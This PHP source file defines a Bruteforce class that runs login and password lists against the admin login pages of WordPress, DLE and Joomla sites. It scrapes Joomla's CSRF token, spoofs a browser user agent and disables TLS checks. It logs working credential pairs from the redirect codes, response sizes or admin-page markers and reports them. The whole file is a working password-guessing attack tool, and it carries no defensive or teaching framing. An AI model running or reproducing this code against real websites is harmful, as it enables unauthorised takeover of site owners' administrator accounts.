<?php

/**
 * Created by PhpStorm.
 * User: Lalka
 * Date: 03.05.2016
 * Time: 16:03
 */
class Bruteforce extends Main
{
//    function __construct()
//    {
//        $this->ch = curl_init();
//    }

    public $type;


    function startScan($source)
    {
        $logins = $source['logins'];
        $passwords = $source['passwords'];
        curl_setopt($this->ch, CURLOPT_POST, 1);
        curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1);
        //curl_setopt($this->ch, CURLOPT_COOKIESESSION, 1);
        curl_setopt($this->ch, CURLOPT_COOKIEJAR, 'cookie.txt');
        curl_setopt($this->ch, CURLOPT_COOKIEFILE, 'cookie.txt');
        curl_setopt($this->ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0");
        curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($this->ch, CURLOPT_SSL_VERIFYHOST, 0);

        // die();
        switch ($this->type) {
            case "wpBrute":
                $this->startBruteWp($logins, $passwords);
                break;
            case "dleBrute":
                $this->startBruteDle($logins, $passwords);
                break;
            case "joomlaBrute":
                $this->startBruteJoomla($logins, $passwords);
                break;
        }


        print_r($logins);
        print_r($passwords);
        //curl_setopt($ch, CURLINFO_HEADER_OUT, 1);
        //curl_setopt($ch, CURLOPT_NOBODY, 1);


        $this->sendResults();
    }

    function startBruteWp($logins, $passwords)
    {
        curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 0);
        curl_setopt($this->ch, CURLOPT_URL, $this->target . "wp-login.php");
        foreach ($logins as $login) {
            foreach ($passwords as $password) {
                $postData = "log=$login&pwd=$password&task=login";
                curl_setopt($this->ch, CURLOPT_POSTFIELDS, $postData);
                curl_exec($this->ch);
                $httpcode = curl_getinfo($this->ch, CURLINFO_HTTP_CODE);
                echo $httpcode . "\n";
                if ($httpcode == 302)
                    array_push($this->result[$this->scid], array("login" => $login, "password" => $password));
            }
        }

    }


    function startBruteDle($logins, $passwords)
    {
        //die($this->target);
        //echo 123;
        curl_setopt($this->ch, CURLOPT_URL, $this->target . "admin.php");
        curl_setopt($this->ch, CURLOPT_HEADER, 1);
        curl_setopt($this->ch, CURLOPT_TIMEOUT, 5);
        //die();
        foreach ($logins as $login) {
            foreach ($passwords as $password) {
                $postData = "subaction=dologin&username=$login&password=$password";
                curl_setopt($this->ch, CURLOPT_POSTFIELDS, $postData);

                $content = curl_exec($this->ch);
                //$httpcode = curl_getinfo($this->ch, CURLINFO_HTTP_CODE);
                if (strlen($content) > 10000) {
                    array_push($this->result[$this->scid], array("login" => $login, "password" => $password));
                    //echo 123123;
                }
                //die();
            }
            //die();
        }

    }

    function startBruteJoomla($logins, $passwords)
    {
        $key = $this->getKey();

        curl_setopt($this->ch, CURLOPT_URL, $this->target . "/administrator/index.php");
        foreach ($logins as $login) {
            foreach ($passwords as $password) {

                $postData = "username=$login&passwd=$password&task=login&option=com_login&$key=1";
                //echo $postData;
                curl_setopt($this->ch, CURLOPT_POSTFIELDS, $postData);
                $content = curl_exec($this->ch);
                $key = $this->getKey($content);
                //echo $content."\n";
                // $httpcode = curl_getinfo($this->ch, CURLINFO_HTTP_CODE);
                //echo $httpcode."\n";
                if (strstr($content, "/administrator/index.php?option=com_menus"))
                    array_push($this->result[$this->scid], array("login" => $login, "password" => $password));
            }
        }


    }

    function getKey($content = "")
    {
        $key = "";
        if ($content == "") {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
            curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
            curl_setopt($ch, CURLOPT_URL, $this->target . "/administrator/");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $content = curl_exec($ch);
            curl_close($ch);
        }
        preg_match('/name="([\w\d]{32})"/', $content, $m);
        if (isset($m[1]))
            $key = $m[1];

        return $key;

    }

}